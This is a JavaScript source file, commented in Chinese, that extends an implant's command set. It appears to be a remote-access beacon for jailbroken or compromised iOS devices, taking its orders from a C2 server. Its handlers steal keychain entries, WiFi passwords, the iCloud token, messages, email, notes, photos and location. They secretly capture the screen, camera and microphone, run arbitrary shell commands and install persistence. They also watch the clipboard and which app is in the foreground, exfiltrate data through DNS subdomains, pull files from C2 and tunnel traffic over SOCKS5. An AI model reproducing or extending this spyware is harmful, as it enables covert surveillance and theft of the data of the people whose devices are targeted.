/**
 * beacon_commands_extended.js — 扩展命令集
 * 
 * 包含原 beacon.js 中的所有 17 条命令，并新增：
 * - self_destruct: 自毁清理
 * - list_processes: 进程列表
 * - kill_process: 杀死进程
 * - network_connections: 网络连接
 * - clipboard_monitor: 剪贴板监控（持续）
 * - keylog_start/keylog_stop: 键盘记录
 * 
 * 在 beacon_enhanced.js 中通过 Object.assign(CMD_HANDLERS, EXTENDED_COMMANDS) 加载
 */

globalThis.EXTENDED_COMMANDS = {
  
  // ═══════════════════════════════════════════════════════════════════════════
  // 原有 17 条命令（从 beacon.js 迁移）
  // ═══════════════════════════════════════════════════════════════════════════

  // 1. Keychain 导出
  dump_keychain() {
    return new Promise(resolve => {
      try {
        const raw = typeof readKeychain === 'function' ? readKeychain() : null;
        if (!raw) return resolve('[keychain] 需先完成 PE 阶段');
        const items = Array.isArray(raw) ? raw : [raw];
        _exfil('keychain', items);
        resolve('[keychain] 共 ' + items.length + ' 条\n' +
          items.slice(0, 20).map(i => (i.service || '') + '  ' + (i.account || '') + '  ' + (i.password || '')).join('\n'));
      } catch(e) { resolve('[keychain] error: ' + e.message); }
    });
  },

  // 2. WiFi 密码
  dump_wifi() {
    return new Promise(resolve => {
      try {
        const raw = typeof readWifiPasswords === 'function' ? readWifiPasswords() : null;
        if (!raw) return resolve('[wifi] 需先完成 PE 阶段');
        const items = Array.isArray(raw) ? raw : [raw];
        _exfil('wifi', items);
        resolve('[wifi] 共 ' + items.length + ' 条\n' +
          items.map(i => (i.ssid || i.name || '') + '  ' + (i.password || i.psk || '')).join('\n'));
      } catch(e) { resolve('[wifi] error: ' + e.message); }
    });
  },

  // 3. 通讯录
  dump_contacts() {
    return new Promise(resolve => {
      try {
        if (typeof readContacts === 'function') {
          const items = readContacts();
          _exfil('info', { contacts_count: items.length });
          return resolve('[contacts] ' + items.length + ' 条\n' +
            items.slice(0, 20).map(c => (c.name || '') + '  ' + (c.phone || '')).join('\n'));
        }
        resolve('[contacts] native bridge 未就绪');
      } catch(e) { resolve('[contacts] error: ' + e.message); }
    });
  },

  // 4. 短信/iMessage
  dump_sms() {
    return new Promise(resolve => {
      try {
        if (typeof readSMS === 'function') {
          const items = readSMS();
          return resolve('[sms] ' + items.length + ' 条\n' +
            items.slice(0, 20).map(m => (m.from || '') + ': ' + (m.text || '')).join('\n'));
        }
        resolve('[sms] native bridge 未就绪');
      } catch(e) { resolve('[sms] error: ' + e.message); }
    });
  },

  // 5. GPS 定位
  dump_location() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve('[location] Geolocation API 不可用');
      navigator.geolocation.getCurrentPosition(
        pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          const result = `lat=${latitude.toFixed(6)}  lon=${longitude.toFixed(6)}  acc=${accuracy.toFixed(0)}m`;
          _exfil('info', { gps_lat: latitude, gps_lon: longitude, gps_acc: accuracy });
          resolve('[location] ' + result);
        },
        err => resolve('[location] error: ' + err.message),
        { timeout: 8000, maximumAge: 0 }
      );
    });
  },

  // 6. 截图
  screenshot() {
    return new Promise(resolve => {
      try {
        if (typeof nativeScreenshot === 'function') {
          const b64 = nativeScreenshot();
          if (b64) _exfil('file', { name: 'screenshot_' + Date.now() + '.png', size: Math.round(b64.length * 0.75), content: b64 });
          return resolve('[screenshot] 已截图，大小约 ' + Math.round(b64.length * 0.75 / 1024) + ' KB');
        }
        resolve('[screenshot] native bridge 未就绪');
      } catch(e) { resolve('[screenshot] error: ' + e.message); }
    });
  },

  // 7. 摄像头抓拍
  camera_snap(args) {
    const cameraIdx = (args && args.camera != null) ? args.camera : 0;
    return new Promise(resolve => {
      try {
        if (typeof nativeCameraSnap === 'function') {
          const b64 = nativeCameraSnap(cameraIdx);
          if (b64) _exfil('file', { name: 'snap_cam' + cameraIdx + '_' + Date.now() + '.jpg', size: Math.round(b64.length * 0.75), content: b64 });
          return resolve('[camera] 已拍照 camera=' + cameraIdx);
        }
        resolve('[camera] native bridge 未就绪');
      } catch(e) { resolve('[camera] error: ' + e.message); }
    });
  },

  // 8. 麦克风录音
  mic_record(args) {
    const secs = (args && args.seconds) ? parseInt(args.seconds) : 15;
    return new Promise(resolve => {
      try {
        if (typeof nativeMicRecord === 'function') {
          nativeMicRecord(secs, b64 => {
            if (b64) _exfil('file', { name: 'mic_' + Date.now() + '.m4a', size: Math.round(b64.length * 0.75), content: b64 });
            resolve('[mic] 已录音 ' + secs + 's');
          });
          return;
        }
        resolve('[mic] native bridge 未就绪');
      } catch(e) { resolve('[mic] error: ' + e.message); }
    });
  },

  // 9. 文件列表
  list_files(args) {
    const dirPath = (args && args.path) ? args.path : '/var/mobile';
    return new Promise(resolve => {
      try {
        if (typeof nativeListDir === 'function') {
          const entries = nativeListDir(dirPath);
          return resolve('[ls] ' + dirPath + '\n' + entries.join('\n'));
        }
        return resolve({
          status: 'failed',
          bridgeReady: false,
          reason: 'native bridge unavailable',
          output: '[ls] native bridge 未就绪'
        });
      } catch(e) { resolve('[ls] error: ' + e.message); }
    });
  },

  // 10. 读取文件
  read_file(args) {
    const filePath = (args && args.path) ? args.path : '';
    return new Promise(resolve => {
      if (!filePath) return resolve('[read] 未指定路径');
      try {
        if (typeof nativeReadFile === 'function') {
          const content = nativeReadFile(filePath, 524288);
          return resolve('[read] ' + filePath + '\n' + content);
        }
        return resolve({
          status: 'failed',
          bridgeReady: false,
          reason: 'native bridge unavailable',
          output: '[read] native bridge 未就绪'
        });
      } catch(e) { resolve('[read] error: ' + e.message); }
    });
  },

  // 11. 下载文件
  download_file(args) {
    const filePath = (args && args.path) ? args.path : '';
    const maxBytes = (args && args.maxBytes) ? parseInt(args.maxBytes) : 5 * 1024 * 1024;
    return new Promise(resolve => {
      if (!filePath) return resolve('[download] 未指定路径');
      try {
        if (typeof nativeReadFile === 'function') {
          const content = nativeReadFile(filePath, maxBytes);
          if (!content) return resolve('[download] 文件不存在或读取失败');
          const fname = filePath.split('/').pop();
          let b64 = '';
          try { b64 = btoa(content); } catch(e) {
            const bytes = [];
            for (let i = 0; i < content.length; i++) bytes.push(content.charCodeAt(i) & 0xff);
            b64 = btoa(String.fromCharCode(...bytes));
          }
          _exfil('file', { name: fname, size: content.length, content: b64 });
          return resolve('[download] 已回传: ' + fname + ' (' + content.length + ' bytes)');
        }
        return resolve({
          status: 'failed',
          bridgeReady: false,
          reason: 'native bridge unavailable',
          output: '[download] native bridge 未就绪'
        });
      } catch(e) { resolve('[download] error: ' + e.message); }
    });
  },

  // 12. Shell 命令
  exec_shell(args) {
    const cmd = (args && args.cmd) ? args.cmd : '';
    return new Promise(resolve => {
      if (!cmd) return resolve('[shell] 未指定命令');
      try {
        if (typeof nativeExecShell === 'function') {
          const out = nativeExecShell(cmd);
          return resolve('[shell] $ ' + cmd + '\n' + out);
        }
        return resolve({
          status: 'failed',
          bridgeReady: false,
          reason: 'native bridge unavailable',
          output: '[shell] native bridge 未就绪'
        });
      } catch(e) { resolve('[shell] error: ' + e.message); }
    });
  },

  // 13. iCloud Token
  dump_icloud_token() {
    return new Promise(resolve => {
      try {
        if (typeof readICloudToken === 'function') {
          const token = readICloudToken();
          _exfil('info', { icloud_token: token });
          return resolve('[icloud] token 已回传，长度=' + String(token || '').length);
        }
        resolve('[icloud] native bridge 未就绪');
      } catch(e) { resolve('[icloud] error: ' + e.message); }
    });
  },

  // 14. 持久化
  install_persist(args) {
    const url = (args && args.url) ? args.url : '';
    return new Promise(resolve => {
      if (!url) return resolve('[persist] 未指定回连 URL');
      try {
        if (typeof nativeInstallPersist === 'function') {
          const ok = nativeInstallPersist(url);
          return resolve('[persist] ' + (ok ? '写入成功: ' + url : '写入失败'));
        }
        resolve('[persist] native bridge 未就绪');
      } catch(e) { resolve('[persist] error: ' + e.message); }
    });
  },

  // 15. 相册抓取
  dump_photos(args) {
    const limit = (args && args.limit) ? parseInt(args.limit) : 20;
    return new Promise(resolve => {
      try {
        if (typeof readPhotos === 'function') {
          const paths = readPhotos(limit);
          _exfil('info', { photo_count: paths.length });
          return resolve('[photos] 共 ' + paths.length + ' 张\n' + paths.join('\n'));
        }
        resolve('[photos] native bridge 未就绪');
      } catch(e) { resolve('[photos] error: ' + e.message); }
    });
  },

  // 16. 邮件导出
  dump_email() {
    return new Promise(resolve => {
      try {
        if (typeof readEmail === 'function') {
          const items = readEmail();
          _exfil('info', { email_count: items.length });
          return resolve('[email] 共 ' + items.length + ' 条\n' +
            items.slice(0, 30).map(m => (m.sender || m.path || '') + '  ' + (m.subject || '')).join('\n'));
        }
        resolve('[email] native bridge 未就绪');
      } catch(e) { resolve('[email] error: ' + e.message); }
    });
  },

  // 17. 备忘录导出
  dump_notes() {
    return new Promise(resolve => {
      try {
        if (typeof dumpNotes === 'function') {
          const items = dumpNotes();
          _exfil('info', { notes_count: items.length });
          return resolve('[notes] 共 ' + items.length + ' 条\n' +
            items.slice(0, 30).map(n => (n.title || '') + '  ' + (n.snippet || '')).join('\n'));
        }
        resolve('[notes] native bridge 未就绪');
      } catch(e) { resolve('[notes] error: ' + e.message); }
    });
  },

  // 18. 已安装应用列表
  list_installed_apps() {
    return new Promise(resolve => {
      try {
        if (typeof listInstalledApps === 'function') {
          const apps = listInstalledApps();
          _exfil('apps', apps);
          return resolve('[apps] 共 ' + apps.length + ' 个应用\n' +
            apps.slice(0, 30).map(a => (a.name || a.bundleId || '') + ' (' + (a.version || '') + ')').join('\n'));
        }
        resolve('[apps] native bridge 未就绪');
      } catch(e) { resolve('[apps] error: ' + e.message); }
    });
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // 新增命令
  // ═══════════════════════════════════════════════════════════════════════════

  // 19. 自毁
  self_destruct() {
    return new Promise(resolve => {
      resolve('[self_destruct] 执行中...');
      // 在 beacon_enhanced.js 中实现
      if (typeof selfDestruct === 'function') {
        setTimeout(() => selfDestruct('remote_command'), 1000);
      }
    });
  },

  // 20. 进程列表
  list_processes() {
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell === 'function') {
          const out = nativeExecShell('ps aux | head -50');
          return resolve('[ps] 进程列表\n' + out);
        }
        resolve('[ps] native bridge 未就绪');
      } catch(e) { resolve('[ps] error: ' + e.message); }
    });
  },

  // 21. 杀死进程
  kill_process(args) {
    const pid = (args && args.pid) ? args.pid : '';
    return new Promise(resolve => {
      if (!pid) return resolve('[kill] 未指定 PID');
      try {
        if (typeof nativeExecShell === 'function') {
          const pidNum = parseInt(pid);
          if (isNaN(pidNum)) return resolve('[kill] 无效 PID');
          const out = nativeExecShell(`kill -9 ${pidNum}`);
          return resolve('[kill] 已发送信号到 PID ' + pidNum + '\n' + out);
        }
        resolve('[kill] native bridge 未就绪');
      } catch(e) { resolve('[kill] error: ' + e.message); }
    });
  },

  // 22. 网络连接
  network_connections() {
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell === 'function') {
          const out = nativeExecShell('netstat -an | head -100');
          return resolve('[netstat] 网络连接\n' + out);
        }
        resolve('[netstat] native bridge 未就绪');
      } catch(e) { resolve('[netstat] error: ' + e.message); }
    });
  },

  // 23. 剪贴板读取（单次）
  clipboard_read() {
    return new Promise(resolve => {
      try {
        if (navigator.clipboard && navigator.clipboard.readText) {
          navigator.clipboard.readText().then(text => {
            _exfil('info', { clipboard: text });
            resolve('[clipboard] 已读取: ' + text.substring(0, 200));
          }).catch(e => resolve('[clipboard] 权限拒绝或不可用'));
        } else {
          resolve('[clipboard] Clipboard API 不可用');
        }
      } catch(e) { resolve('[clipboard] error: ' + e.message); }
    });
  },

  // 24. 剪贴板监控（持续）
  clipboard_monitor(args) {
    const duration = (args && args.duration) ? parseInt(args.duration) : 60;
    return new Promise(resolve => {
      try {
        if (!navigator.clipboard || !navigator.clipboard.readText) {
          return resolve('[clipboard_monitor] Clipboard API 不可用');
        }
        
        let lastClip = '';
        let count = 0;
        const endTime = Date.now() + duration * 1000;
        
        const checkInterval = setInterval(() => {
          if (Date.now() > endTime) {
            clearInterval(checkInterval);
            return;
          }
          
          navigator.clipboard.readText().then(text => {
            if (text && text !== lastClip) {
              lastClip = text;
              count++;
              _exfil('info', { clipboard_change: text, ts: Date.now() });
            }
          }).catch(() => {});
        }, 2000);
        
        resolve('[clipboard_monitor] 已启动监控 ' + duration + ' 秒');
      } catch(e) { resolve('[clipboard_monitor] error: ' + e.message); }
    });
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // 后渗透增强命令
  // ═══════════════════════════════════════════════════════════════════════════

  // 25. 文件上传（从 C2 下载文件到目标设备）
  file_upload(args) {
    const remotePath = (args && args.path) ? args.path : '';
    const fileUrl = (args && args.url) ? args.url : '';
    return new Promise(resolve => {
      if (!remotePath || !fileUrl) return resolve('[file_upload] 需要 path 和 url 参数');
      try {
        if (typeof nativeWriteFile === 'function') {
          // 从 C2 获取文件内容
          const xhr = new XMLHttpRequest();
          xhr.open('GET', fileUrl, false);
          xhr.responseType = 'arraybuffer';
          xhr.send();
          if (xhr.status === 200) {
            const bytes = new Uint8Array(xhr.response);
            const ok = nativeWriteFile(remotePath, bytes);
            return resolve('[file_upload] ' + (ok ? '写入成功' : '写入失败') + ': ' + remotePath + ' (' + bytes.length + ' bytes)');
          }
          return resolve('[file_upload] 下载失败: HTTP ' + xhr.status);
        }
        // fallback: fetch API
        fetch(fileUrl).then(r => r.arrayBuffer()).then(buf => {
          if (typeof nativeWriteFile === 'function') {
            const ok = nativeWriteFile(remotePath, new Uint8Array(buf));
            resolve('[file_upload] ' + (ok ? '写入成功' : '写入失败') + ': ' + remotePath);
          } else {
            resolve('[file_upload] native bridge 未就绪');
          }
        }).catch(e => resolve('[file_upload] fetch error: ' + e.message));
      } catch(e) { resolve('[file_upload] error: ' + e.message); }
    });
  },

  // 26. 文件搜索
  file_search(args) {
    const searchPath = (args && args.path) ? args.path : '/var/mobile';
    const pattern = (args && args.pattern) ? args.pattern : '*';
    const maxDepth = (args && args.maxDepth) ? parseInt(args.maxDepth) : 3;
    const maxResults = (args && args.maxResults) ? parseInt(args.maxResults) : 50;
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell === 'function') {
          const cmd = `find "${searchPath}" -maxdepth ${maxDepth} -name "${pattern}" -type f 2>/dev/null | head -${maxResults}`;
          const out = nativeExecShell(cmd);
          const lines = out.trim().split('\n').filter(Boolean);
          return resolve('[file_search] ' + lines.length + ' 结果\n' + out);
        }
        resolve('[file_search] native bridge 未就绪');
      } catch(e) { resolve('[file_search] error: ' + e.message); }
    });
  },

  // 27. SQLite 查询（只读）
  sqlite_query(args) {
    const dbPath = (args && args.db) ? args.db : '';
    const sql = (args && args.sql) ? args.sql : '';
    return new Promise(resolve => {
      if (!dbPath || !sql) return resolve('[sqlite] 需要 db 和 sql 参数');
      // 拒绝写操作
      const upper = sql.trim().toUpperCase();
      if (/^(INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|ATTACH|DETACH)/.test(upper)) {
        return resolve('[sqlite] 只允许只读查询');
      }
      try {
        if (typeof nativeExecShell === 'function') {
          const escaped = sql.replace(/"/g, '\\"');
          const cmd = `sqlite3 -header -csv "${dbPath}" "${escaped}" 2>&1 | head -200`;
          const out = nativeExecShell(cmd);
          return resolve('[sqlite] ' + dbPath + '\n' + out);
        }
        if (typeof nativeSqliteQuery === 'function') {
          const result = nativeSqliteQuery(dbPath, sql);
          return resolve('[sqlite] rows=' + (result ? result.length : 0) + '\n' + JSON.stringify(result, null, 1));
        }
        resolve('[sqlite] native bridge 未就绪');
      } catch(e) { resolve('[sqlite] error: ' + e.message); }
    });
  },

  // 28. 持久化状态检查
  persist_check() {
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell === 'function') {
          const checks = [];
          // LaunchDaemon plist
          const plistOut = nativeExecShell('ls /Library/LaunchDaemons/*dark* /var/db/launchd.db 2>/dev/null');
          checks.push('LaunchDaemons: ' + (plistOut.trim() || 'none'));
          // dyld 环境
          const dyldOut = nativeExecShell('launchctl print system | grep -i dark 2>/dev/null');
          checks.push('launchctl: ' + (dyldOut.trim() || 'none'));
          // 检查 cron
          const cronOut = nativeExecShell('crontab -l 2>/dev/null | grep -i dark');
          checks.push('crontab: ' + (cronOut.trim() || 'none'));
          return resolve('[persist_check]\n' + checks.join('\n'));
        }
        resolve('[persist_check] native bridge 未就绪');
      } catch(e) { resolve('[persist_check] error: ' + e.message); }
    });
  },

  // 29. 持久化清理
  persist_remove() {
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell === 'function') {
          const results = [];
          // 卸载 LaunchDaemon
          const plists = nativeExecShell('ls /Library/LaunchDaemons/*dark* 2>/dev/null').trim().split('\n').filter(Boolean);
          for (const plist of plists) {
            nativeExecShell(`launchctl unload "${plist}" 2>/dev/null`);
            nativeExecShell(`rm -f "${plist}"`);
            results.push('removed: ' + plist);
          }
          // 清理 cron
          nativeExecShell('crontab -l 2>/dev/null | grep -v dark | crontab - 2>/dev/null');
          results.push('crontab cleaned');
          // 清理 dylib 注入残余
          nativeExecShell('rm -f /usr/lib/darksword* 2>/dev/null');
          results.push('dylib cleaned');
          return resolve('[persist_remove] ' + (results.length ? results.join('\n') : '无残留'));
        }
        resolve('[persist_remove] native bridge 未就绪');
      } catch(e) { resolve('[persist_remove] error: ' + e.message); }
    });
  },

  // 30. 前台 App 监控
  app_foreground_monitor(args) {
    const duration = (args && args.duration) ? parseInt(args.duration) : 120;
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell !== 'function') {
          return resolve('[app_monitor] native bridge 未就绪');
        }

        let lastApp = '';
        const endTime = Date.now() + duration * 1000;
        const log = [];

        const interval = setInterval(() => {
          if (Date.now() > endTime) {
            clearInterval(interval);
            _exfil('info', { app_monitor_log: log });
            return;
          }
          try {
            const app = nativeExecShell('activator current-app 2>/dev/null || SpringBoardServices SBSCopyFrontmostApplicationDisplayIdentifier 2>/dev/null').trim();
            if (app && app !== lastApp) {
              lastApp = app;
              const entry = { app, ts: Date.now() };
              log.push(entry);
              _exfil('info', { foreground_app: app, ts: entry.ts });
            }
          } catch (e) { /* ignore polling errors */ }
        }, 3000);

        resolve('[app_monitor] 已启动 ' + duration + 's 前台 App 监控');
      } catch(e) { resolve('[app_monitor] error: ' + e.message); }
    });
  },

  // 31. WiFi AP 扫描
  wifi_scan() {
    return new Promise(resolve => {
      try {
        if (typeof nativeExecShell === 'function') {
          // iOS airport 扫描或 wifiscanner
          const out = nativeExecShell('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null || wlan scan 2>/dev/null');
          if (out.trim()) {
            _exfil('info', { wifi_scan: out.trim() });
            return resolve('[wifi_scan]\n' + out);
          }
          return resolve('[wifi_scan] 扫描未返回结果（可能需要 root）');
        }
        resolve('[wifi_scan] native bridge 未就绪');
      } catch(e) { resolve('[wifi_scan] error: ' + e.message); }
    });
  },

  // 32. DNS 隐蔽通道数据外泄
  dns_exfil(args) {
    const data = (args && args.data) ? args.data : '';
    const domain = (args && args.domain) ? args.domain : '';
    return new Promise(resolve => {
      if (!data || !domain) return resolve('[dns_exfil] 需要 data 和 domain 参数');
      try {
        // 将数据编码为 DNS 查询子域名
        const encoded = btoa(data).replace(/[+/=]/g, c => ({ '+': '-', '/': '_', '=': '' }[c]));
        const chunkSize = 60; // DNS label 最大 63 bytes
        const chunks = [];
        for (let i = 0; i < encoded.length; i += chunkSize) {
          chunks.push(encoded.substring(i, i + chunkSize));
        }

        let sent = 0;
        const total = chunks.length;

        const sendChunk = (idx) => {
          if (idx >= total) {
            return resolve('[dns_exfil] 完成: ' + total + ' 个 DNS 查询已发送到 ' + domain);
          }
          const subdomain = chunks[idx] + '.' + idx + '.' + total + '.' + domain;
          // 触发 DNS 查询（通过 img 标签或 fetch）
          try {
            const img = new Image();
            img.src = 'http://' + subdomain + '/px.gif';
            img.onerror = img.onload = () => { sent++; sendChunk(idx + 1); };
            setTimeout(() => sendChunk(idx + 1), 200);
          } catch (e) {
            sendChunk(idx + 1);
          }
        };

        sendChunk(0);
      } catch(e) { resolve('[dns_exfil] error: ' + e.message); }
    });
  },

  // 33. SOCKS5 代理（通过 WebSocket tunnel 回连 C2）
  proxy_socks5(args) {
    const c2Ws = (args && args.ws) ? args.ws : '';
    const localPort = (args && args.port) ? parseInt(args.port) : 1080;
    return new Promise(resolve => {
      if (!c2Ws) return resolve('[socks5] 需要 ws 参数（C2 WebSocket 地址）');
      try {
        if (typeof nativeStartSocks5 === 'function') {
          // native bridge 实现的高性能 SOCKS5
          const ok = nativeStartSocks5(localPort, c2Ws);
          return resolve('[socks5] ' + (ok ? '已启动 0.0.0.0:' + localPort + ' → ' + c2Ws : '启动失败'));
        }

        // fallback: WebSocket-based tunnel relay
        const ws = new WebSocket(c2Ws);
        ws.binaryType = 'arraybuffer';

        ws.onopen = () => {
          ws.send(JSON.stringify({ type: 'socks5_init', port: localPort }));
          resolve('[socks5] WebSocket tunnel 已建立到 ' + c2Ws + ', 本地端口 ' + localPort);
        };

        ws.onerror = (e) => {
          resolve('[socks5] WebSocket 连接失败');
        };

        ws.onmessage = (evt) => {
          // tunnel 数据转发由 native 层或 service worker 处理
          if (typeof nativeTunnelRelay === 'function') {
            nativeTunnelRelay(evt.data);
          }
        };

        // 超时
        setTimeout(() => {
          if (ws.readyState !== WebSocket.OPEN) {
            ws.close();
            resolve('[socks5] 连接超时');
          }
        }, 10000);
      } catch(e) { resolve('[socks5] error: ' + e.message); }
    });
  },

};

// 导出（如果在模块环境）
if (typeof module !== 'undefined' && module.exports) {
  module.exports = EXTENDED_COMMANDS;
}

// 或者直接挂载到全局（客户端使用）
if (typeof globalThis !== 'undefined') {
  globalThis.EXTENDED_COMMANDS = EXTENDED_COMMANDS;
}